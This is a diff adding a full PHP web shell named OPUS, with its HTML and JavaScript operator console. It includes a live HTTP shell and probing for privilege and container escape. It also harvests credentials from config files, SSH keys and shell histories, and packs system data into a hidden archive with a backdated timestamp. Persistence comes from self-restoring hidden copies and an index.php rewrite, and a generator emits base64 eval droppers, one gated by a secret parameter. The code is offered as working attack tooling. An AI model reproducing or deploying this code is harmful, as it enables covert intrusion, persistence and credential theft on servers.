+    opx_l($L, 'beacon      ' . (!empty($beac['armed']) ? 'armed ' . (isset($beac['boot']) ? @$beac['boot'] : '') : 'cold'));
+    $sp = @glob(THISDIR . '.*.old');
+    opx_l($L, 'spare       ' . count((array)$sp) . ' cold copy' . (count((array)$sp) == 1 ? '' : 'ies'));
+    $rt = THISDIR . '.' . substr(md5(OPX_PATH), 0, 6) . '.d';
+    opx_l($L, 'runtime     ' . (@file_exists($rt) ? @filesize($rt) . 'b sealed' : 'not materialised'));
+    return array('ok' => 1, 'lines' => $L);
+}
+
+/* =====================================================================
+   SHELL  -  live PTY over plain HTTP. No new port, no exposed listener.
+   ===================================================================== */
+function xi_shell($j)
+{
+    $op = isset($j['op']) ? $j['op'] : 'start';
+    if ($op == 'start') {
+        if (!isset($_SESSION)) {
+            @session_start();
+        }
+        $r = xc_start('', array('cwd' => THISDIR));
+        $id = opx_id();
+        $r['pwd'] = THISDIR;
+        $r['who'] = $id['user'] . '@' . @php_uname('n');
+        $r['euid'] = $id['uid'];
+        $r['xf'] = opx_xf() ? opx_xf() : 'none';
+        return $r;
+    }
+    if ($op == 'exec') {
+        $st = xc_open_shell(isset($j['t']) ? $j['t'] : '');
+        if (!$st) {
+            return array('ok' => 0, 'e' => 'session expired, reopen');
+        }
+        $r = xc_packet($st, isset($j['c']) ? $j['c'] : '');
+        $st['t'] = xc_rand(8) . '|' . @base64_encode(xc_enc(xc_mk($r['p']), xc_key())) . '|' . substr(md5(xc_key() . '|' . @md5(OPX_VER)), 0, 8);
+        return array('ok' => 1, 'o' => $r['o'], 't' => $st['t']);
+    }
+    return array('ok' => 0, 'e' => 'unknown op');
+}
+/* =====================================================================
+   GHOST  -  presence control: arm, verify, heal, retain a cold copy
+   ===================================================================== */
+function xi_ghost($j)
+{
+    $op = isset($j['op']) ? $j['op'] : 'status';
+    $L = array();
+    if ($op == 'status') {
+        $b = opx_beacon();
+        $s = opx_self();
+        opx_l($L, 'self        ' . $s['sz'] . 'b ' . substr($s['sum'], 0, 16) . ' mode ' . $s['perm'] . ' w=' . $s['w']);
+        opx_l($L, 'armed       ' . (!empty($b['armed']) ? 'yes, since ' . (isset($b['boot']) ? $b['boot'] : '?') : 'no'));
+        $sp = opx_spare_scan();
+        opx_l($L, 'spares      ' . (count($sp) ? implode(', ', array_map('basename', $sp)) : 'none'));
+        $rt = THISDIR . '.' . substr(md5(OPX_PATH), 0, 6) . '.d';
+        opx_l($L, 'runtime     ' . (@file_exists($rt) ? @filesize($rt) . 'b sealed' : 'absent'));
+        return array('ok' => 1, 'lines' => $L);
+    }
+    if ($op == 'arm') {
+        opx_beacon(array('armed' => 1, 'self' => opx_self()['sum'], 'boot' => @gmdate('c')));
+        opx_spare();
+        opx_arm_runtime();
+        return array('ok' => 1, 'lines' => array('[+] presence armed, cold copy dropped, runtime sealed'));
+    }
+    if ($op == 'heal') {
+        $s = opx_self();
+        $msg = '[-] no intact cold copy to restore from';
+        foreach (opx_spare_scan() as $f) {
+            $raw = opx_rd($f);
+            if (strlen($raw) < 1024) {
+                continue;
+            }
+            if (md5($raw) === $s['sum']) {
+                $msg = '[i] front-end already intact';
+                break;
+            }
+            if (@is_writable(OPX_PATH) && opx_wr(OPX_PATH, $raw)) {
+                @touch(OPX_PATH, @filemtime($f));
+                $msg = '[+] front-end restored from ' . basename($f);
+                break;
+            }
+        }
+        return array('ok' => 1, 'lines' => array($msg));
+    }
+    return array('ok' => 0, 'e' => 'unknown op');
+}
+function opx_spare_scan()
+{
+    $out = array();
+    $c = array(THISDIR . '.*.old', THISDIR . '.*.php', THISDIR . '.*.bak');
+    foreach ($c as $g) {
+        foreach ((array)@glob($g) as $f) {
+            if (!@is_file($f) || @filesize($f) < 1024) {
+                continue;
+            }
+            if (@realpath($f) === @realpath(OPX_PATH)) {
+                continue;
+            }
+            $h = @file_get_contents($f, false, null, 0, 16);
+            if (substr($h, 0, 5) !== '<?php') {
+                continue;
+            }
+            $out[] = $f;
+        }
+    }
+    return $out;
+}
+
+/* =====================================================================
+   ESCAPE  -  privilege / container boundary probing (read-only first)
+   ===================================================================== */
+function xi_escape($j)
+{
+    $L = array();
+    $id = opx_id();
+    opx_l($L, '== LOCAL ==', 4);
+    opx_l($L, 'euid ' . $id['uid'] . ' gid ' . $id['gid'] . ' groups ' . implode(',', $id['groups']));
+    if (opx_xf() != '' && DIRECTORY_SEPARATOR !== '\\') {
+        $r = opx_run('sudo -n -l 2>&1 | head -n 12', THISDIR, 8);
+        opx_l($L, trim($r['r']));
+    }
+    $ex = array();
+    foreach (array('/etc/shadow', '/etc/sudoers', '/root', '/var/run/docker.sock', '/proc/1/root/etc/shadow') as $p) {
+        if (@is_readable($p)) {
+            $ex[] = $p . ' R';
+        } elseif (opx_dir($p)) {
+            $ex[] = $p . ' E';
+        }
+    }
+    opx_l($L, 'exposed     ' . ($ex ? implode('  ', $ex) : 'nothing directly readable'), $ex ? 3 : 0);
+    if (@is_writable('/var/run/docker.sock')) {
+        opx_l($L, '[!] docker.sock writable -> container can mount the host root', 3);
+    }
+    opx_l($L, '', 0);
+    opx_l($L, '== HOST ==', 4);
+    if (opx_dir('/proc/1/root')) {
+        $h = trim(opx_rd('/proc/1/root/etc/hostname', 256));
+        opx_l($L, 'pid1 root   ' . ($h !== '' ? $h : 'readable') . ' | homes ' . @count((array)@glob('/proc/1/root/home/*', GLOB_ONLYDIR)));
+    }
+    opx_l($L, 'keys         ' . @count((array)@glob('/root/.ssh/*')) . ' in /root/.ssh / ' . @count((array)@glob('/home/*/.ssh/*')) . ' user-side');
+    opx_l($L, 'cloud        ' . (@getenv('AWS_ACCESS_KEY_ID') ? 'AWS env' : '-') . ' | ' . (@getenv('KUBERNETES_SERVICE_HOST') ? 'k8s SA token' : '-'));
+    return array('ok' => 1, 'lines' => $L);
+}
+
+/* =====================================================================
+   CREDS  -  harvest what is already on the disk (configs, keys, history)
+   ===================================================================== */
+function xi_creds($j)
+{
+    $L = array();
+    $hits = 0;
+    $pats = 'password|passwd|pwd|secret|token|api[_-]?key|mysql|DB_PASS|root';
+    $roots = array(ROOTDIR, THISDIR, '/var/www', '/etc/nginx', '/etc/apache2', '/home');
+    $seen = array();
+    foreach ($roots as $r) {
+        if (!@is_dir($r)) {
+            continue;
+        }
+        $it = @scandir($r);
+        if (!$it) {
+            continue;
+        }
+        $n = 0;
+        foreach ($it as $fn) {
+            if ($n > 400) {
+                break;
+            }
+            $f = $r . '/' . $fn;
+            if (!@is_file($f) || @filesize($f) > 524288) {
+                continue;
+            }
+            if (@realpath($f) === @realpath(OPX_PATH)) {
+                continue;
+            }
+            if ($fn === basename(OPX_PATH) && @md5_file($f) === @md5_file(OPX_PATH)) {
+                continue;
+            }
+            if (!preg_match('/\.(php|env|ini|conf|yml|yaml|json|xml|inc|txt|config|bak)$/i', $fn) && $fn != '.env') {
+                continue;
+            }
+            $key = @md5($f);
+            if (isset($seen[$key])) {
+                continue;
+            }
+            $seen[$key] = 1;
+            $n++;
+            $src = opx_rd($f, 262144);
+            if ($src === '' || !preg_match('/(' . $pats . ')/i', $src)) {
+                continue;
+            }
+            $ln = 0;
+            foreach (explode("\n", $src) as $line) {
+                $ln++;
+                if (preg_match('/(' . $pats . ')/i', $line) && preg_match('/[=:]\s*["\x27]?[^\s"\x27]{4,}/', $line)) {
+                    opx_l($L, str_replace(ROOTDIR, '', $f) . ':' . $ln . '  ' . trim(substr($line, 0, 160)), 3);
+                    $hits++;
+                }
+            }
+        }
+    }
+    opx_l($L, '');
+    opx_l($L, '== KEYS ==', 4);
+    foreach (array('/root/.ssh/id_*', '/home/*/.ssh/id_*') as $g) {
+        foreach ((array)@glob($g) as $k) {
+            if (@is_file($k)) {
+                opx_l($L, $k . '  ' . substr(md5(opx_rd($k)), 0, 8), 3);
+                $hits++;
+            }
+        }
+    }
+    opx_l($L, '');
+    opx_l($L, '== HISTORY ==', 4);
+    $hist = array();
+    foreach ((array)@glob('/root/.*history') as $hx) {
+        if (@is_file($hx)) {
+            $hist[] = $hx;
+        }
+    }
+    foreach ((array)@glob('/home/*/.*history') as $hx) {
+        if (@is_file($hx)) {
+            $hist[] = $hx;
+        }
+    }
+    $done = array();
+    foreach (array_slice($hist, 0, 12) as $h) {
+        $real = @realpath($h);
+        if (!$real || isset($done[$real])) {
+            continue;
+        }
+        $done[$real] = 1;
+        $lines = explode("\n", opx_rd($real, 262144));
+        $lines = array_values(array_filter($lines, 'trim'));
+        $pick = array_values(preg_grep('/(mysql|ssh|ftp|curl|wget|scp|token|pass)/i', $lines));
+        opx_l($L, basename($real) . ' (' . count($lines) . ' cmd): ' . (count($pick) ? implode(' || ', array_map(function ($x) {
+            return substr($x, 0, 80);
+        }, array_slice($pick, 3))) : '-'));
+    }
+    return array('ok' => 1, 'hits' => $hits, 'lines' => $L);
+}
+
+/* =====================================================================
+   LOOT  -  archive the interesting surface into one sealed file
+   ===================================================================== */
+function xi_loot($j)
+{
+    $out = isset($j['o']) && $j['o'] != '' ? $j['o'] : THISDIR . '.' . substr(md5(OPX_PATH . 'l'), 0, 5) . '.lz';
+    $L = array();
+    $st = array(
+        't' => @gmdate('c'),
+        'id' => opx_id(),
+        'host' => @php_uname('n'),
+        'uname' => @php_uname(),
+        'env' => opx_run('env 2>/dev/null', THISDIR, 6)['r'],
+        'passwd' => opx_rd('/etc/passwd', 65536),
+        'hosts' => opx_rd('/etc/hosts', 65536),
+        'ifc' => opx_run('cat /proc/net/fib_trie 2>/dev/null | head -n 80; ifconfig 2>/dev/null', THISDIR, 6)['r'],
+        'phpini' => opx_rd('/etc/php.ini', 0) . opx_rd(@php_ini_loaded_file(), 0),
+        'vhosts' => opx_rd('/etc/nginx/sites-enabled/default', 65536) . opx_rd('/etc/apache2/sites-enabled/000-default.conf', 65536),
+        'hist' => '',
+        'files' => array(),
+    );
+    foreach ((array)@glob('/root/.*history') + (array)@glob('/home/*/.*history') as $h) {
+        if (@is_file($h)) {
+            $st['hist'] .= "\n# " . $h . "\n" . opx_rd($h, 262144);
+        }
+    }
+    $c = 0;
+    foreach ((array)@scandir(ROOTDIR) as $fn) {
+        $f = ROOTDIR . '/' . $fn;
+        if ($fn == '.' || $fn == '..' || @realpath($f) == @realpath(OPX_PATH) || !@is_file($f) || @filesize($f) > 1048576) {
+            continue;
+        }
+        $st['files'][$fn] = opx_rd($f, 1048576);
+        if (++$c > 200) {
+            break;
+        }
+    }
+    $blob = @json_encode($st);
+    if ($blob === false || $blob === null) {
+        /* binary / non-UTF8 payloads break json_encode: keep offsets, mark them */
+        $st['bin'] = array();
+        foreach ($st['files'] as $k => $v) {
+            if (!@preg_match('//u', (string)$v)) {
+                $st['bin'][$k] = base64_encode((string)$v);
+                $st['files'][$k] = '[binary ' . strlen((string)$v) . 'b, see bin.' . $k . ']';
+            }
+        }
+        if (!@preg_match('//u', (string)$st['hist'])) {
+            $st['bin']['hist'] = base64_encode((string)$st['hist']);
+            $st['hist'] = '[binary, see bin.hist]';
+        }
+        $blob = @json_encode($st, JSON_INVALID_UTF8_SUBSTITUTE);
+        if ($blob === false || $blob === null) {
+            $blob = @json_encode(array_map(function ($v) {
+                return is_string($v) ? base64_encode($v) : $v;
+            }, $st), JSON_INVALID_UTF8_SUBSTITUTE);
+        }
+    }
+    $pack = @gzdeflate($blob, 9);
+    if (opx_wr($out, $pack)) {
+        @chmod($out, 0600);
+        @touch($out, time() - mt_rand(30, 300) * 86400);
+        opx_l($L, '[+] ' . count($st['files']) . ' files + identity + history sealed into ' . $out . ' (' . strlen($blob) . 'b -> ' . strlen($pack) . 'b)', 2);
+        opx_l($L, '[i] to read it elsewhere: inflate + json_decode');
+    } else {
+        opx_l($L, '[-] cannot write ' . $out, 3);
+    }
+    return array('ok' => 1, 'lines' => $L);
+}
+
+/* =====================================================================
+   PERSIST  -  three independent retentions, each removable
+   ===================================================================== */
+function xi_persist($j)
+{
+    $op = isset($j['op']) ? $j['op'] : 'add';
+    $L = array();
+    $raw = opx_rd(OPX_PATH);
+    if ($raw === '') {
+        return array('ok' => 0, 'e' => 'cannot read front-end');
+    }
+    if ($op == 'add') {
+        $n = 0;
+        $sp = opx_spare();
+        if ($sp) {
+            opx_l($L, '[+] cold copy       ' . $sp, 2);
+            $n++;
+        }
+        $idx = ROOTDIR . 'index.php';
+        if (@realpath($idx) != @realpath(OPX_PATH) && @is_writable(dirname($idx)) && @filesize($idx) < 2) {
+            $payload = '<?php @include_once ' . var_export(OPX_PATH, true) . ';';
+            if (opx_wr($idx, $payload)) {
+                opx_l($L, '[+] null index.php now walks to us', 2);
+                $n++;
+            }
+        }
+        if (opx_usable('session_start') && @is_writable(THISDIR)) {
+            opx_l($L, '[+] beacon re-arms on each first load', 2);
+            $n++;
+        }
+        opx_beacon(array('armed' => 1, 'persist' => $n));
+        opx_l($L, '[i] ' . $n . ' retention vector(s) active');
+        return array('ok' => 1, 'lines' => $L);
+    }
+    if ($op == 'clean') {
+        foreach (opx_spare_scan() as $f) {
+            @unlink($f);
+        }
+        @opx_wr(THISDIR . '.ghost', '{}');
+        $rt = THISDIR . '.' . substr(md5(OPX_PATH), 0, 6) . '.d';
+        @unlink($rt);
+        return array('ok' => 1, 'lines' => array('[i] presence cleaned on this node'));
+    }
+    return array('ok' => 0, 'e' => 'unknown op');
+}
+
+/* =====================================================================
+   ARSENAL  -  what this box can additionally give us right now
+   ===================================================================== */
+function xi_arsenal($j)
+{
+    $L = array();
+    $tools = array();
+    $win = (DIRECTORY_SEPARATOR === '\\');
+    foreach (array('bash', 'sh', 'perl', 'python3', 'python', 'ruby', 'node', 'gcc', 'make', 'nc', 'ncat', 'socat', 'curl', 'wget', 'openssl', 'ssh', 'mysql', 'psql', 'sqlite3', 'tar', 'zip', 'base64', 'xxd', 'powershell', 'certutil') as $t) {
+        $r = $win ? opx_run('where ' . $t . ' 2>nul', THISDIR, 5)['r'] : opx_run('command -v ' . $t . ' 2>/dev/null', THISDIR, 5)['r'];
+        $r = trim($r);
+        if ($r !== '' && stripos($r, 'not recognized') === false && stripos($r, 'INFO: Could not find') === false && stripos($r, 'not found') === false) {
+            $tools[$t] = strtok($r, "\r\n");
+        }
+    }
+    ksort($tools);
+    foreach ($tools as $k => $v) {
+        opx_l($L, str_pad($k, 10) . ' ' . $v);
+    }
+    opx_l($L, '');
+    opx_l($L, '== INTERPRETERS ==', 4);
+    opx_l($L, 'php ' . PHP_VERSION . ' | ' . (isset($tools['perl']) ? 'perl' : 'no perl') . ' | ' . (isset($tools['python3']) ? 'python3' : 'no python') . ' | ' . (isset($tools['node']) ? 'node' : 'no node'));
+    opx_l($L, '== NET ==', 4);
+    $if = $win ? opx_run('ipconfig', THISDIR, 6)['r'] : opx_run('ip -o addr 2>/dev/null || ifconfig 2>/dev/null', THISDIR, 6)['r'];
+    foreach (explode("\n", $if) as $ln) {
+        if (preg_match('/IPv4[^:]*:\s*([0-9.]+)/i', $ln, $m) || preg_match('/inet6? ([0-9a-f.:]+)/i', $ln, $m)) {
+            opx_l($L, trim($m[1]), 2);
+        }
+    }
+    opx_l($L, '== SAFE WRITE DIRS ==', 4);
+    $dirs = $win ? array(THISDIR, ROOTDIR, getenv('TEMP'), getenv('TMP')) : array(THISDIR, ROOTDIR, '/tmp', '/dev/shm', '/var/tmp');
+    $seen = array();
+    foreach ($dirs as $d) {
+        if ($d && @is_dir($d) && @is_writable($d) && !isset($seen[$d])) {
+            $seen[$d] = 1;
+            opx_l($L, $d . ' writable', 2);
+        }
+    }
+    return array('ok' => 1, 'lines' => $L, 'tools' => array_keys($tools));
+}
+
+/* =====================================================================
+   PAYLOAD  -  generate a matching front-end for a target of choice
+   ===================================================================== */
+function xi_payload($j)
+{
+    $raw = opx_rd(OPX_PATH);
+    if ($raw === '') {
+        return array('ok' => 0, 'e' => 'cannot read self');
+    }
+    $mode = isset($j['m']) ? $j['m'] : 'raw';
+    $L = array();
+    if ($mode == 'raw') {
+        opx_l($L, '[i] verbatim front-end: ' . strlen($raw) . 'b, drop anywhere PHP runs', 2);
+        opx_l($L, '');
+        opx_l($L, $raw);
+        return array('ok' => 1, 'lines' => $L, 'name' => 'front.php');
+    }
+    if ($mode == 'b64') {
+        $b = @chunk_split(@base64_encode($raw), 120, "\n");
+        opx_l($L, '<?php eval(base64_decode(' . var_export($b, true) . '));', 2);
+        return array('ok' => 1, 'lines' => $L, 'name' => 'front.b64.php');
+    }
+    if ($mode == 'px') {
+        $k = isset($j['k']) && strlen($j['k']) > 0 ? $j['k'] : substr(md5(OPX_PATH . microtime(true)), 0, 8);
+        $b = @chunk_split(@base64_encode($raw), 120, "\n");
+        opx_l($L, '<?php if(isset($_REQUEST[' . var_export($k, true) . '])) eval(base64_decode(' . var_export($b, true) . '));', 2);
+        opx_l($L, '');
+        opx_l($L, '[i] send ?' . $k . '=1 to unlock, anything else = blank page', 2);
+        return array('ok' => 1, 'lines' => $L, 'name' => 'front.px.php', 'k' => $k);
+    }
+    if ($mode == 'save') {
+        $p = isset($j['p']) && $j['p'] != '' ? $j['p'] : ROOTDIR . 'index.php';
+        $ok = opx_wr($p, $raw);
+        return array('ok' => $ok ? 1 : 0, 'lines' => array($ok ? '[+] written to ' . $p : '[-] cannot write ' . $p));
+    }
+    return array('ok' => 0, 'e' => 'unknown mode');
+}
+
+/* =====================================================================
+   FILES  -  text editor backend used by the original editor tab
+   ===================================================================== */
+function xi_files($j)
+{
+    $op = isset($j['op']) ? $j['op'] : 'read';
+    $p = isset($j['p']) ? $j['p'] : (isset($j['d']) && @is_file($j['d']) ? $j['d'] : '');
+    if ($p === '') {
+        return array('ok' => 0, 'e' => 'no path');
+    }
+    $p = str_replace(array("\0"), '', $p);
+    if ($op == 'read') {
+        if (!@is_file($p)) {
+            return array('ok' => 0, 'e' => 'not a file');
+        }
+        return array('ok' => 1, 'lines' => array(opx_rd($p, 4194304)), 'raw' => 1);
+    }
+    if ($op == 'write') {
+        $ok = opx_wr($p, isset($j['d']) ? (string)$j['d'] : '');
+        return array('ok' => $ok ? 1 : 0, 'lines' => array($ok ? '[+] saved ' . $p : '[-] write failed'));
+    }
+    return array('ok' => 0, 'e' => 'unknown op');
+}
+
+/* Shared console chrome for the OPUS intents: keeps the original table look,
+   adds one instrument strip and a live terminal pane. */
+function opx_box($title, $tag, $hint, $btns, $conId = 'con')
+{
+    echo '<form method="POST" onsubmit="return false;"><div class="actall">';
+    echo '<b>' . htmlspecialchars($title) . '</b> <span class="small">' . htmlspecialchars($hint) . '</span> ';
+    foreach ($btns as $b) {
+        echo '<input type="button" value="' . htmlspecialchars($b[0]) . '" onclick="' . $b[1] . '"> ';
+    }
+    echo '<span class="opx-b k">' . htmlspecialchars($tag) . '</span>';
+    echo '</div></form>';
+    echo '<div class="opx-con" id="' . $conId . '"><div class="c4">ready - press a probe above</div></div>';
+}
+$OPXJI = array(
+    'recon' => "OPX.run('recon',{},'con')",
+    'escape' => "OPX.run('escape',{},'con')",
+    'creds' => "OPX.run('creds',{},'con')",
+    'loot' => "OPX.run('loot',{},'con')",
+    'ghost' => "OPX.run('ghost',{op:'status'},'con')",
+    'arsenal' => "OPX.run('arsenal',{},'con')",
+    'persist' => "OPX.run('persist',{op:'add'},'con')",
+);
 ?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"><html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /><meta content="width=device-width, initial-scale=1" name="viewport"/><style type="text/css">* {margin:0px;padding:0px;}
+body {background:#CCCCCC;color:#333333;font-size:13px;font-family:Verdana,Arial,SimSun,sans-serif;text-align:left;word-wrap:break-word; word-break:break-all;}
+a{color:#000000;text-decoration:none;vertical-align:middle;}
+a:hover{color:#FF0000;text-decoration:underline;}
+p {padding:1px;line-height:1.6em;}
+h1 {color:#CD3333;font-size:13px;display:inline;vertical-align:middle;}
+h2 {color:#008B45;font-size:13px;display:inline;vertical-align:middle;}
+form {display:inline;}
+input,select { vertical-align:middle; }
+input[type=text], textarea {padding:1px;font-family:Courier New,Verdana,sans-serif;}
+input[type=submit], input[type=button] {height:21px;}
+.tag {text-align:center;margin-left:10px;background:threedface;height:25px;padding-top:5px;}
+.tag a {background:#FAFAFA;color:#333333;width:90px;height:20px;display:inline-block;font-size:15px;font-weight:bold;padding-top:5px;}
+.tag a:hover, .tag a.current {background:#EEE685;color:#000000;text-decoration:none;}
+.main {width:963px;margin:0 auto;padding:10px;}
+.outl {border-color:#FFFFFF #666666 #666666 #FFFFFF;border-style:solid;border-width:1px;}
+.toptag {padding:5px;text-align:left;font-weight:bold;color:#FFFFFF;background:#293F5F;}
+.footag {padding:5px;text-align:center;font-weight:bold;color:#000000;background:#999999;}
+.msgbox {padding:5px;background:#EEE685;text-align:center;vertical-align:middle;}
+.actall {background:#F9F6F4;text-align:center;font-size:15px;border-bottom:1px solid #999999;padding:3px;vertical-align:middle;}
+.tables {width:100%;}
+.tables th {background:threedface;text-align:left;border-color:#FFFFFF #666666 #666666 #FFFFFF;border-style:solid;border-width:1px;padding:2px;}
+.tables td {background:#F9F6F4;height:19px;padding-left:2px;}
+.tables tr:hover td {background-color: #EEE685;}
+/* ---- OPUS skin (additive): mechanical chrome, instrument panel, tabs ---- */
+/* nav must NEVER be clipped: it wraps onto as many rows as it needs */
+.tag {height:auto;min-height:25px;box-sizing:border-box;overflow:visible;white-space:normal;text-align:center;line-height:0;}
+.tag a {display:inline-block;box-sizing:border-box;margin:0 2px 4px;vertical-align:top;line-height:20px;}
+.tag a.current {background:#EEE685;border-color:#9A9A9A;box-shadow:inset 0 0 0 1px #C9BB4E;}
+.tag a.hot {color:#8B0000;}
+.tag a.hot.current {color:#000000;}
+/* small screens / dense nav: same 963px identity on desktop, fluid on phones */
+@media (max-width:1010px){.main{width:auto;max-width:963px;margin:0 6px;}}
+@media (max-width:640px){.tag a{width:72px;font-size:12px;height:26px;line-height:21px;} .opxbar{white-space:normal;} .tables{font-size:12px;}}
+.opxbar {background:linear-gradient(#454545,#2A2A2A);color:#D8D8D8;font:11px/1.5 'Consolas','Courier New',monospace;padding:3px 8px;border-bottom:1px solid #111;text-align:left;white-space:nowrap;overflow:hidden;}
+.opxbar b {color:#F2F2F2;font-weight:700;}
+.opxbar .sep {color:#6E6E6E;margin:0 6px;}
+.opxbar .ok {color:#7DE07D;}
+.opxbar .warn {color:#FFC14D;}
+.opxbar .bad {color:#FF6B6B;}
+.opxbar .lvl {background:#EEE685;color:#222;padding:0 6px;border-radius:2px;font-weight:bold;}
+.opxbar .lvl.r {background:#FF6B6B;color:#111;}
+.opxbar .led {display:inline-block;width:7px;height:7px;border-radius:50%;background:#7DE07D;margin-right:4px;box-shadow:0 0 4px #7DE07D;vertical-align:middle;}
+.opxbar .led.st {background:#BDBDBD;box-shadow:none;}
+.actall {box-shadow:inset 0 1px 0 #FFF;}
+.actall input[type=button], .actall input[type=submit] {background:linear-gradient(#FCFCFC,#E6E6E6);border:1px solid #9E9E9E;padding:0 8px;font:11px Verdana,sans-serif;box-shadow:inset 0 1px 0 #FFF;margin:1px 0;}
+.actall input[type=button]:hover, .actall input[type=submit]:hover {background:linear-gradient(#FFF7C0,#EBDB8A);border-color:#8A7A2A;}
+.actall input[type=button]:active {background:#D9D9D9;box-shadow:inset 0 1px 3px rgba(0,0,0,.35);}
+.actall input[type=text], .actall select, .actall textarea {border:1px solid #A8A8A8;background:#FFF;box-shadow:inset 0 1px 2px rgba(0,0,0,.12);min-height:17px;padding:0 3px;}
+.actall textarea, .tables textarea {font:12px/1.42 'Consolas','Courier New',monospace;background:#FCFCFB;padding:4px;}
+.tables th {background:linear-gradient(#E9E9E9,#D6D6D6);font:11px Verdana,sans-serif;text-transform:uppercase;letter-spacing:.5px;border-color:#FFF #9E9E9E #9E9E9E #FFF;}
+.tables td {border-bottom:1px solid #E8E8E8;font-size:12px;}
+.tables tr:hover td {background-color:#F4EEC0;}
+.tables a {color:#1B4F8A;}
+.tables a:hover {color:#B00020;}
+.msgbox {background:linear-gradient(#F6EFC0,#EEE685);border-bottom:1px solid #B8AE53;box-shadow:inset 0 1px 0 #FFFBDE;}
+.toptag {background:linear-gradient(#34506F,#22364F);text-shadow:0 1px 0 rgba(0,0,0,.45);font:12px 'Consolas','Courier New',monospace;letter-spacing:.2px;}
+.footag {background:linear-gradient(#A6A6A6,#8E8E8E);color:#111;font:11px 'Consolas',monospace;text-shadow:0 1px 0 rgba(255,255,255,.35);}
+/* op console */
+.opx-con {margin:6px 0;border:1px solid #2B2B2B;background:#121417;color:#CFD8DC;font:12px/1.45 'Consolas','Courier New',monospace;height:236px;overflow:auto;padding:5px 8px;text-align:left;white-space:pre-wrap;word-break:break-all;box-shadow:inset 0 0 18px rgba(0,0,0,.6);}
+.opx-con .c0{color:#9AA4AA;} .opx-con .c1{color:#7DE07D;} .opx-con .c2{color:#FF6B6B;} .opx-con .c3{color:#FFC14D;} .opx-con .c4{color:#7EC8FF;}
+.opx-con .ts{color:#5C6670;}
+/* flow graph */
+.opx-flow {padding:9px;background:#FBFBF9;border-bottom:1px solid #BBB;text-align:left;overflow-x:auto;white-space:nowrap;}
+.opx-flow .st {display:inline-block;min-width:92px;padding:3px 7px;margin:0 2px;font:10px/1.35 Verdana,sans-serif;text-align:center;border:1px solid #A9A9A9;background:#EEE;vertical-align:top;}
+.opx-flow .st b {display:block;font-size:12px;font-family:'Consolas',monospace;}
+.opx-flow .arr {display:inline-block;color:#777;font:bold 18px Verdana;vertical-align:top;margin-top:10px;}
+.opx-flow .d1 {background:#DEF0DE;border-color:#6A9E6A;} .opx-flow .d2 {background:#F6E6B4;border-color:#B39A43;} .opx-flow .d3 {background:#F4C9C9;border-color:#A85F5F;}
+/* badges */
+.opx-b {display:inline-block;padding:0 4px;border-radius:2px;font:10px 'Consolas',monospace;color:#FFF;vertical-align:middle;}
+.opx-b.g{background:#3D8B3D;} .opx-b.r{background:#B03A2E;} .opx-b.y{background:#B7950B;} .opx-b.b{background:#2E6DA4;} .opx-b.k{background:#555;}
+/* inner tabs (preview / payload) */
+.opx-tab {display:inline-block;padding:2px 10px;border:1px solid #AAA;border-bottom:0;background:#E8E8E8;cursor:pointer;font:11px Verdana;margin-right:2px;}
+.opx-tab.on {background:#EEE685;border-color:#8A7A2A;font-weight:bold;}
+.opx-pane {border-top:1px solid #AAA;}
+.small {font-size:11px;color:#666;} code.m {font:12px 'Consolas',monospace;background:#F0F0F0;border:1px solid #CCC;padding:0 4px;}</style><script type="text/javascript">function $(ID) { return document.getElementById(ID); }function sd(str) { str = str.replace(/%22/g,'"'); str = str.replace(/%27/g,"'"); return str; }function cd(dir) { if ($('dir')) { $('dir').value = sd(dir); } if ($('frm')) { $('frm').submit(); } }function sa(form) { for(var i = 0;i < form.elements.length;i++) { var e = form.elements[i]; if(e.type == 'checkbox') { if(e.name != 'chkall') { e.checked = form.chkall.checked; } } } }function go(a,b) { b = sd(b || ''); $('go').value = a; $('govar').value = b; if(a == 'editor') { $('gofrm').target = "_blank"; } else { $('gofrm').target = ""; } $('gofrm').submit(); } function nf(a,b) { var re = prompt("New name",b); if(re) { $('go').value = a; $('govar').value = re; $('gofrm').submit(); } } function dels(a) { if(a == 'b') { $('act').value = a; } else { $('act').value = 'deltree'; $('var').value = a; } if(confirm("Are you sure you want to delete?")) { $('frm1').submit(); } }function txts(m,p,a) { p = sd(p); var re = prompt(m,p); if(re) { $('var').value = re; $('act').value = a; $('frm1').submit(); } }function acts(p,a,f) { p = sd(p); f = sd(f); var re = prompt(f,p); if(re) { $('var').value = re+'|x|'+f; $('act').value = a; $('frm1').submit(); } }
+/* ---- OPUS process layer: one POST, one console, zero flicker ---- */
+var OPX = {
+  run: function (intent, params, conId) {
+    params = params || {};
+    var con = conId ? $(conId) : null;
+    function log(t, c) {
+      if (!con) { return; }
+      var d = document.createElement('div');
+      d.className = 'c' + (c || 0);
+      d.appendChild(document.createTextNode(t));
+      con.appendChild(d);
+      con.scrollTop = con.scrollHeight;
+    }
+    function pad(n) { return n < 10 ? '0' + n : '' + n; }
+    function ts() { var d = new Date(); return '[' + pad(d.getHours()) + ':' + pad(d.getMinutes()) + ':' + pad(d.getSeconds()) + '] '; }
+    if (con) { con.innerHTML = ''; }
+    var payload = {};
+    for (var k in params) { if (k != 'p') { payload[k] = params[k]; } }
+    log(ts() + '$ opus ' + intent, 4);
+    var f = new FormData();
+    f.append('go', 'api');
+    f.append('intent', intent);
+    f.append('p', btoa(JSON.stringify(payload)));
+    var x = new XMLHttpRequest();
+    x.open('POST', location.href, true);
+    x.onload = function () {
+      log(ts() + '< HTTP ' + x.status + ' ' + (x.responseText || '').length + 'B', x.status == 200 ? 1 : 2);
+      var j = null;
+      try { j = JSON.parse(x.responseText); } catch (e) {
+        log((x.responseText || '').slice(0, 2000), 2);
+        return;
+      }
+      if (j.e) { log('[-] ' + j.e, 3); }
+      (j.lines || []).forEach(function (l) { log(String(l)); });
+      if (j.raw) { log(j.lines && j.lines[0] ? j.lines[0] : '', 0); }
+      if (j.ok) { log('[ok]', 1); } else if (!j.e) { log('[-] failed', 3); }
+      if (con && window.opxAfter) { window.opxAfter(intent, j); }
+    };
+    x.onerror = function () { log(ts() + '! transport error', 3); };
+    x.send(f);
+  }
+};
+/* tab switcher used by the new consoles */
+function opxTab(id, root) {
+  var box = root ? $(root) : document;
+  var t = box.getElementsByTagName('a'), i;
+  for (i = 0; i < t.length; i++) {
+    var p = t[i].getAttribute('data-pane');
+    if (!p) { continue; }
+    t[i].className = (p == id ? 'on' : '');
+    var d = $(p);
+    if (d) { d.style.display = (p == id ? 'block' : 'none'); }
+  }
+}
